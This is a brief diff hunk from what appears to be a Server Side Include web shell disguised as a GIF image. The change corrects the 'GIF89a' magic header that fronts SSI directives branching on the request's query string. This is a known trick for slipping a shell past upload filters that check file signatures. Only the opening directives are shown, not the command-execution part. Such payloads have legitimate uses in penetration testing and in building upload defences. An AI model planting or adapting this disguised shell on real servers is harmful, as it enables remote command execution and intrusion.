@@ -1,4 +1,4 @@
-GIF89A;
+GIF89a;
 <!--#config errmsg="[ERROR] SSI DISABLED"-->
 <!--#set var="zero" value="" -->
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
